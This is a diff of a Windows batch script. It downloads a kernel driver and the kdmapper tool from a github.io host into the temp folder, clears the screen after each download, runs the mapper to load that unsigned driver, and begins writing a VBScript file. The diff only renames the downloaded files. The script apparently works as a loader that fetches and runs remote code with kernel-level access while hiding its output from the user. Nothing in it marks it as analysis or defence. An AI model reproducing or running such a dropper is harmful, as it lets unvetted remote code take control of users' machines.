@@ -1,11 +1,11 @@
 @echo off
 cd %temp%
-curl -o driver.sys https://getserver.github.io/api/keysys/driver.sys
+curl -o driver1.sys https://getserver.github.io/api/keysys/driver.sys
 cls
-curl -o injecti.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
+curl -o inject1.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
 cls
 
-"injecti.exe" "driver.sys"
+"inject1.exe" "driver1.sys"
 
 set VBScriptFile=temp.vbs
 
